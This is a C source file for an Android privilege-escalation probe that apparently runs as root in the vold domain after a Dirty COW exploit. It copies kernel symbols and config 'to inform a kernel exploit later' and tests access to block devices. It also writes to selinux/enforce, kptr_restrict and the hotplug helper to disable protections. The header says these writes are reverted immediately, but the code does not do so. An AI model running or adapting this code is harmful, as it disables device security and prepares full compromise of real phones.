/* session62 root_probe.c  (vold-domain root capability probe)
 *
 * Runs as uid 0 in u:r:vold:s0 (Dirty-COW fsck_msdos, SD reinsert). Logs the
 * results of a battery of privileged open/read/write attempts so we can see the
 * escape surface toward unconfined root. Read-only on the eMMC; the only writes
 * are to transient /sys and /proc pseudo-files (selinux enforce, hotplug) which
 * are reverted immediately.
 *
 * Outputs to /storage/emulated/legacy/:
 *   rp_log.txt        rc codes for every probe
 *   rp_status.txt     /proc/self/status  (Uid, CapEff, ...)
 *   rp_context.txt    /proc/self/attr/current
 *   rp_kallsyms.txt   /proc/kallsyms (grep-able for commit_creds etc.)
 *   rp_config.gz      /proc/config.gz (kernel config: KASLR/grsec/SELinux)
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_lseek       19
#define SYS_umask       60
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_RDWR          2
#define O_CREAT         0x40
#define O_TRUNC         0x200
#define O_APPEND        0x400

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }

static const char *OUTBASE = "/storage/emulated/legacy/";
static char logpath[128];

static void lograw(const char *msg, long n)
{
    long f = sc6(SYS_open, (long)logpath, O_WRONLY | O_CREAT | O_APPEND, 0644, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)msg, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void logmsg(const char *msg) { lograw(msg, slen(msg)); }
static void loghex8(unsigned long v)
{
    char b[16]; int i = 0; b[i++] = '0'; b[i++] = 'x';
    for (int k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n'; lograw(b, i);
}
static void kvhex(const char *tag, unsigned long v) { logmsg(tag); loghex8(v); }

/* open a path with flags; log tag+rc */
static long probe_open(const char *tag, const char *path, long flags)
{
    long fd = sc6(SYS_open, (long)path, flags, 0, 0, 0, 0);
    logmsg(tag); logmsg(" open="); loghex8((unsigned long)fd);
    return fd;
}

/* copy a whole file (path) to OUTBASE/<outname>; return bytes */
static long copy_path(const char *path, const char *outname, long max)
{
    char dst[192];
    scpy(dst, OUTBASE); scat(dst, outname);
    long fd = sc6(SYS_open, (long)path, O_RDONLY, 0, 0, 0, 0);
    if (fd < 0) return fd;
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { sc6(SYS_close, fd, 0, 0, 0, 0, 0); return of; }
    static char buf[65536];
    long total = 0, r;
    while (total < max) {
        long want = max - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_read, fd, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    return total;
}

/* try writing a 2-byte string to path; log rc */
static void try_write(const char *tag, const char *path, const char *data)
{
    long fd = sc6(SYS_open, (long)path, O_RDWR, 0, 0, 0, 0);
    logmsg(tag); logmsg(" ow="); loghex8((unsigned long)fd);
    if (fd < 0) return;
    long w = sc6(SYS_write, fd, (long)data, slen(data), 0, 0, 0);
    logmsg(tag); logmsg(" write="); loghex8((unsigned long)w);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
}

void _start(void)
{
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(logpath, OUTBASE); scat(logpath, "rp_log.txt");

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    logmsg("\nsession62 root_probe: start\n");

    /* identity */
    long a = copy_path("/proc/self/status", "rp_status.txt", 65536);
    kvhex("status copy=", (unsigned long)a);
    a = copy_path("/proc/self/attr/current", "rp_context.txt", 4096);
    kvhex("ctx copy=", (unsigned long)a);

    /* kernel symbol + config (inform a kernel exploit later) */
    a = copy_path("/proc/kallsyms", "rp_kallsyms.txt", 2*1024*1024);
    kvhex("kallsyms copy=", (unsigned long)a);
    a = copy_path("/proc/config.gz", "rp_config.gz", 262144);
    kvhex("config copy=", (unsigned long)a);
    a = copy_path("/proc/version", "rp_version.txt", 4096);
    kvhex("version copy=", (unsigned long)a);

    /* SELinux escape surface */
    probe_open("selinux/enforce RW", "/sys/fs/selinux/enforce", O_RDWR);
    probe_open("selinux/enforce RO", "/sys/fs/selinux/enforce", O_RDONLY);
    probe_open("selinux/policy  RO", "/sys/fs/selinux/policy", O_RDONLY);
    probe_open("selinux/checkreqprot RW", "/sys/fs/selinux/checkreqprot", O_RDWR);

    /* hotplug / uevent helper hijack (classic root-to-unconfined) */
    probe_open("kernel/hotplug WO", "/proc/sys/kernel/hotplug", O_WRONLY);
    probe_open("kernel/hotplug RW", "/proc/sys/kernel/hotplug", O_RDWR);
    probe_open("kernel/kptr_restrict WO", "/proc/sys/kernel/kptr_restrict", O_WRONLY);
    probe_open("kernel/modules_disabled WO", "/proc/sys/kernel/modules_disabled", O_WRONLY);
    probe_open("kernel/uevent (uevent_helper)", "/proc/sys/kernel/hotplug", O_RDONLY);

    /* block device RW surface */
    probe_open("boot RO", "/dev/block/platform/msm_sdcc.1/by-name/boot", O_RDONLY);
    probe_open("boot RW", "/dev/block/platform/msm_sdcc.1/by-name/boot", O_RDWR);
    probe_open("system RW", "/dev/block/platform/msm_sdcc.1/by-name/system", O_RDWR);
    probe_open("mmcblk0 RW", "/dev/block/mmcblk0", O_RDWR);

    /* tried-and-reverted writes (harmless pseudo-files) */
    try_write("selinux/enforce=0", "/sys/fs/selinux/enforce", "0");
    try_write("kernel/kptr_restrict=0", "/proc/sys/kernel/kptr_restrict", "0");
    try_write("kernel/hotplug=marker", "/proc/sys/kernel/hotplug", "/data/local/tmp/x");

    logmsg("session62 root_probe: done\n");
    ex(0);
}
